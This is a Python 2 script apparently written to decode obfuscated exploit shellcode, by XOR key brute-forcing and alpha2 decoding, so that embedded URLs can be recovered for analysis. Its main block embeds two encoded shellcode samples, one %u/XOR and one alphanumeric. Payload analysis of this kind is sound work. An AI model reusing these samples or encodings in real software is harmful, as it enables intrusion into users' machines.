'''
Created on 2016-5-3

@author: wenhuizone
'''
#!/usr/bin/env python
#encoding=utf-8

"""
"""

from re import compile,I,findall
from urllib import unquote

class Shellcode():
    """

    """
    def __init__(self):
        self.shellcode=""#
        self.chars=[]#

    def pre(self,shellcode,sep=None):
        """
        """
        self.shellcode=""
        if sep:
            for slic in shellcode.split(sep):
                h=slic[:2]
                l=slic[2:]
                self.shellcode+="%%%02s%%%02s"%(l,h)
            self.shellcode=self.shellcode.replace("%  ","")
        else:
            shellcode=findall("""RHpt([^"'\s]+)""",shellcode)
            if shellcode:
                shellcode=shellcode[0]
            shellcode="RHpt"+shellcode

            for i in range(len(shellcode)):
                self.shellcode+="%%%02x"%ord(shellcode[i])
    
    def pre_xor(self):
        """
        xor
        """
        chars=int("68747470",16)
        for i in range(256):
            xor=int(("%02x"%i)*4,16)
            datas="%08x"%(chars^xor)
            a=datas[:2]
            b=datas[2:4]
            c=datas[4:6]
            d=datas[6:]
            char="\%%%s\%%%s\%%%s\%%%s"%(a,b,c,d)
            self.chars.append(char)

    def auto_xor(self):
        """
        """
        i=255
        chars=self.chars
        while chars:
            regex=chars.pop(-1)
            sign=findall(regex,self.shellcode,2)
            if sign:
                break
            i-=1
        if i!=-1:
            return i
        else:
            return None

    def xor(self,key=0):
        """
        """
        if not key:
            return self.shellcode
        else:
            key=int(key)
            shellcode=""
            for slic in self.shellcode.split("%"):
                if slic!="":
                    shellcode+="%%%02x"%(int(slic,16)^key)
            self.shellcode=shellcode
            return self.shellcode

    def alpha2(self):
        """
        """
        shellcode=""
        self.shellcode=self.shellcode.replace("%","")
        for i in range(0,len(self.shellcode),4):
            entmp=self.shellcode[i:i+7]
            sz=[]
            for x in range(0,len(entmp),2):
                sz.append(entmp[x:x+2])
            a="%%%x"%(int(sz[0][-1],16)^int(sz[1][0],16))
            shellcode+=(a+str(sz[1][-1]))
        self.shellcode=shellcode

    def decode(self):
        """
        """
        return unquote(self.shellcode)

if __name__=="__main__":
    s=Shellcode()
    s.pre_xor()
    s.pre("%uC9D5%uCDC9%u9287%uD492%u8888%u89D0%u8C8C%uDC93%uCDCD%uCDCE%uC9D2%uDE93%uD0D2%uBDBD","%u")
    s.xor(s.auto_xor())
    print s.decode()
    print
    s.pre("PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYIhkmKzyCDq4l4FQyBlrRWEahI1tLKT16Pnk1ftLnkPvwlnkW6fhNkan5pNkgF6XPOR8T5HsCivaN19okQSPlKRLvD6DNk3uelNkpTthRXuQ9znk2jEHLK1Ja0FaXkhcTtBink4tlKUQhnvQYotqo0ylnLMTO0SDEWZahOtMwqhG8kXteksLwTdh1e8aLKsja4uQ8kavLKdLrklK0ZeL7qjKLKUTLKuQM8k9bdvDeL1qiSnR5XVIXTOyjENikrphNnrnVnhlBrzHooKOYoyok93u7tOKCNyHzBBSnguLgTcbyxlNKOYoYoMYaUTHphRL2LupQQ0htsFRTn541x3E2Se5T26PyKK8QLTddJlIZFBvyoSeUTLIkrv0oKy8ORpMmlk7Gl6DBrm8SoyoioyoaxrOqh0XwP1xu1Qw1upBbHrmrED3T34qiKOxQLTdEZOyZCaxQmRxgPUp0hpnPn4srRe8BDSo2PT7axqOCWROpophSYpnSo04u83K72Peu70hBpCsqDpF4qHIMXpLQ429k98aEaJr1BF3Ca3bIozp01IPf0Yof5GxAA")
    s.alpha2()
    print s.decode()
